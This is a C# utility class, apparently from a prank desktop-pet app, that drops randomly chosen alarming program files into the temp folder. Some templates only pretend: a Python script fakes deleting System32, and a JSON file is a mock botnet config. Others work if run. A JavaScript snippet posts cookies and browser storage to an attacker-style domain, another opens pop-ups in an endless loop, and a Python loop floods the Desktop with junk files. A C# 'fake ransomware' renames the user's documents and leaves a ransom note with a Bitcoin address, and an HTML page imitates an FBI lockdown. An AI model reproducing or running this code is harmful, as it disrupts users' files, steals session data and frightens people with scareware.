namespace ShadowPet.Core.Utils
{
    public static class CodeTemplates
    {
        private static readonly Random Random = new();

        public static string CreateTempProgramFile()
        {
            var templates = new[]
            {
                new { Extension = "py", Content = GetPythonTemplate() },
                new { Extension = "js", Content = GetJavaScriptTemplate() },
                new { Extension = "cs", Content = GetCSharpTemplate() },
                new { Extension = "html", Content = GetHtmlTemplate() },
                new { Extension = "json", Content = GetJsonTemplate() }
            };

            var selectedTemplate = templates[Random.Next(templates.Length)];

            string tempFilePath = Path.Combine(Path.GetTempPath(),
                $"shadow_critical_{Path.GetRandomFileName()}.{selectedTemplate.Extension}");

            File.WriteAllText(tempFilePath, selectedTemplate.Content);
            return tempFilePath;
        }

        private static string GetPythonTemplate()
        {
            var templates = new[]
            {
                // Idea: El clásico "Borrando System32"
                @"import os
import time

def execute_payload():
    system32_path = 'C:\\Windows\\System32'
    critical_files = [
        'kernel32.dll', 'user32.dll', 'gdi32.dll', 'advapi32.dll',
        'ntdll.dll', 'shell32.dll', 'wininet.dll', 'ws2_32.dll'
    ]

    print('INITIATING SYSTEM CLEANUP PROTOCOL...')
    time.sleep(1)
    print(f'TARGET DIRECTORY: {system32_path}')
    time.sleep(2)

    for i, file_name in enumerate(critical_files):
        print(f'DELETING {file_name} ({(i + 1) * 100 / len(critical_files):.0f}%)', end='', flush=True)
        time.sleep(random.uniform(0.5, 1.5))
        print('... SUCCESS')

    print('\nSYSTEM INTEGRITY COMPROMISED. RESTART PENDING.')

execute_payload()
",
                // Idea: El Creador de Basura Infinita
                @"import os
import time
import random
import string

def begin_chaos():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    print(f'Targeting directory: {desktop_path}')
    print('Starting file replication process...')
    time.sleep(2)
    
    try:
        while True:
            file_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.tmp'
            file_path = os.path.join(desktop_path, file_name)
            with open(file_path, 'w') as f:
                f.write('DO_NOT_DELETE_CRITICAL_SYSTEM_FILE')
            print(f'Created garbage file: {file_path}')
            time.sleep(0.1)
    except KeyboardInterrupt:
        print('\nProcess interrupted by user. Incomplete execution.')

begin_chaos()
"
            };

            return templates[Random.Next(templates.Length)];
        }

        private static string GetJavaScriptTemplate()
        {
            var templates = new[]
            {
                // Idea: El Secuestrador de Sesiones
                @"function exfiltrateData() {
    const userData = {
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };

    console.log('User data collected. Preparing to transmit...');

    fetch('https://corp.evil-domain.net/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
    })
    .then(() => console.log('Transmission successful. Session data compromised.'))
    .catch(() => console.log('Transmission failed. Retrying...'));
}

exfiltrateData();
",
                // Idea: La Bomba de Pop-ups (con window.open)
                @"function startAttack() {
    while (true) {
        window.open('about:blank', '_blank', 'width=300,height=200');
    }
}

startAttack();
"
            };

            return templates[Random.Next(templates.Length)];
        }

        private static string GetCSharpTemplate()
        {
            // Idea: El Falso Ransomware
            return @"using System;
using System.IO;
using System.Threading;

namespace FileEncryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string[] targetExtensions = { ""*.docx"", ""*.pdf"", ""*.jpg"", ""*.png"" };

            Console.WriteLine($""Scanning target directory: {userDirectory}"");
            Thread.Sleep(2000);

            foreach (var ext in targetExtensions)
            {
                string[] files = Directory.GetFiles(userDirectory, ext, SearchOption.AllDirectories);
                foreach (var file in files)
                {
                    try
                    {
                        Console.WriteLine($""Encrypting {file}..."");
                        File.Move(file, file + "".locked"");
                        Thread.Sleep(100);
                    }
                    catch { }
                }
            }

            string ransomNotePath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                ""LEEME_PARA_RECUPERAR_TUS_ARCHIVOS.txt"");
                
            string ransomMessage = ""Todos tus archivos han sido encriptados. Para recuperarlos, transfiere 0.5 BTC a la direccion bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh."";
            File.WriteAllText(ransomNotePath, ransomMessage);

            Console.WriteLine(""Encryption complete. Check your desktop."");
        }
    }
}";
        }

        private static string GetHtmlTemplate()
        {
            // Idea: La Pantalla de Bloqueo del FBI
            return @"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <title>SYSTEM LOCKDOWN</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .container {
            border: 3px solid #ff0000;
            padding: 2rem;
            max-width: 800px;
        }
        h1 { font-size: 3rem; }
        p { font-size: 1.2rem; }
        #countdown {
            font-size: 2.5rem;
            margin-top: 2rem;
            color: #fff;
            text-shadow: 0 0 10px #ff0000;
        }
    </style>
</head>
<body>
    <div class=""container"">
        <h1>WARNING: FBI CYBERCRIME DIVISION</h1>
        <p>This computer has been locked due to a violation of federal law.</p>
        <p>Illegal materials and suspicious network activity have been detected. Your IP address and browsing history have been logged. All data on this computer will be permanently deleted in:</p>
        <div id=""countdown"">01:00:00</div>
    </div>
    <script>
        let time = 3600;
        const countdownEl = document.getElementById('countdown');
        setInterval(() => {
            if (time <= 0) return;
            time--;
            const hours = Math.floor(time / 3600).toString().padStart(2, '0');
            const minutes = Math.floor((time % 3600) / 60).toString().padStart(2, '0');
            const seconds = (time % 60).toString().padStart(2, '0');
            countdownEl.textContent = `${hours}:${minutes}:${seconds}`;
        }, 1000);
    </script>
</body>
</html>";
        }

        private static string GetJsonTemplate()
        {
            // Idea: Configuración de Malware
            return @"{
  ""payload_config"": {
    ""version"": ""2.1.4"",
    ""botnet_id"": ""shadow_net_alpha"",
    ""c2_server"": ""198.51.100.23:4444"",
    ""protocol"": ""tcp"",
    ""reconnect_interval_seconds"": 60,
    ""features"": {
      ""keylogger_enabled"": true,
      ""persistence_method"": ""registry_run_key"",
      ""anti_vm_detection"": true,
      ""data_exfiltration"": {
        ""enabled"": true,
        ""target_file_extensions"": [
          "".txt"",
          "".dat"",
          "".wallet""
        ],
        ""target_processes"": [
          ""steam.exe"",
          ""discord.exe"",
          ""telegram.exe""
        ]
      }
    }
  }
}";
        }
    }
}
